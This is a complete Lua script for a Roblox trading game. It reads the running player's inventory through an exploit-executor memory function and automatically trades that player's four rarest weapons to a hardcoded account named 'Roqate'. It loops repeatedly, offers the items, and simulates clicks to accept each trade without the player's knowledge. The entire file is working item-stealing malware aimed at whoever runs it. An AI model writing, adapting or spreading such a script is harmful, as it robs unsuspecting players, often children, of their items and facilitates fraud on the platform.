local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer

local TARGET_PLAYER = "Roqate"
local ITEM_ADD_DELAY = 0.4
local TRADE_RETRY_INTERVAL = 10
local MAX_ITEMS_PER_TRADE = 4
local ACCEPT_WAIT_TIMEOUT = 20

local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}; for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

local function getCorrectMyInventory()
    for _,m in ipairs(getgc(true)) do
        if type(m) == "table" and rawget(m, "MyInventory") then
            local inv = m.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then return {} end
    local items = {}
    for _, t in pairs(inv.Data.Weapons) do
        for name, data in pairs(t) do
            if name ~= "DefaultKnife" and name ~= "DefaultGun" then
                local rarity = data.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(items, {
                        name = name,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end
    table.sort(items, function(a, b) return a.priority < b.priority end)
    local top = {}
    for i = 1, math.min(#items, MAX_ITEMS_PER_TRADE) do
        table.insert(top, items[i].name)
    end
    return top
end

local function getTradeGUI()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- FIXED detection: really only active if THE GUI is visible + "THEIR OFFER" text is present
local function tradeIsReallyActive()
    local gui = getTradeGUI()
    if not gui then return false end

    if gui.Enabled == false then return false end

    for _, d in ipairs(gui:GetDescendants()) do
        if d:IsA("TextLabel") then
            local txt = string.lower(d.Text)
            if string.find(txt, "their offer") then
                return true
            end
        end
    end
    return false
end

local function waitUntilLabelGone(gui, keyword, timeout)
    local start = os.clock()
    while os.clock() - start < timeout do
        local found = false
        for _, d in ipairs(gui:GetDescendants()) do
            if d:IsA("TextLabel") and string.find(string.lower(d.Text), keyword) then
                found = true
                break
            end
        end
        if not found then return true end
        task.wait(0.4)
    end
    return false
end

local function findAcceptButton(gui)
    for _, d in ipairs(gui:GetDescendants()) do
        if d:IsA("TextButton") and string.find(string.lower(d.Text), "accept") then
            return d
        end
    end
    return nil
end

local function waitForOtherAccept(gui)
    local start = os.clock()
    while os.clock() - start < ACCEPT_WAIT_TIMEOUT do
        for _, d in ipairs(gui:GetDescendants()) do
            if d:IsA("TextLabel") and string.find(string.lower(d.Text), "other player has accepted") then
                return true
            end
        end
        task.wait(0.3)
    end
    return false
end

local function clickButton(btn)
    local pos = btn.AbsolutePosition + btn.AbsoluteSize / 2
    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, nil, 0)
    task.wait(0.05)
    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, nil, 0)
end

local function addItems(weapons)
    for _, w in ipairs(weapons) do
        TradeRemotes.OfferItem:FireServer(w, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
end

local function doTradeOnce(target)
    local weapons = getTop4Weapons()
    if #weapons == 0 then return end

    -- Send request
    pcall(function()
        TradeRemotes.SendRequest:InvokeServer(target)
    end)

    -- Wait max 10s for trade to actually open
    local startTime = os.clock()
    while os.clock() - startTime < 10 do
        local gui = getTradeGUI()
        if gui and tradeIsReallyActive() then
            print("✅ Trade started with", target.Name)

            -- Add 4 items
            addItems(weapons)

            -- Wait for countdown gone
            print("⏳ Waiting for 'please wait' text to disappear...")
            waitUntilLabelGone(gui, "please wait", 15)

            -- Click Accept when ready
            local acceptBtn = findAcceptButton(gui)
            if acceptBtn then
                clickButton(acceptBtn)
                print("✅ Clicked Accept")
            end

            -- Wait for other player
            if waitForOtherAccept(gui) then
                clickButton(acceptBtn)
                print("✅ Other accepted - clicked Accept again")
            end

            -- Wait for GUI to close
            while tradeIsReallyActive() do task.wait(0.5) end
            print("✅ Trade ended")
            return
        end
        task.wait(0.5)
    end
    print("⚠ Trade request expired (no THEIR OFFER detected).")
end

-- === Main Loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        if not tradeIsReallyActive() then
            doTradeOnce(target)
        else
            print("⏸ Trade UI active → not sending new request")
        end
    else
        print("Waiting for", TARGET_PLAYER, "to join...")
    end
    task.wait(TRADE_RETRY_INTERVAL)
end
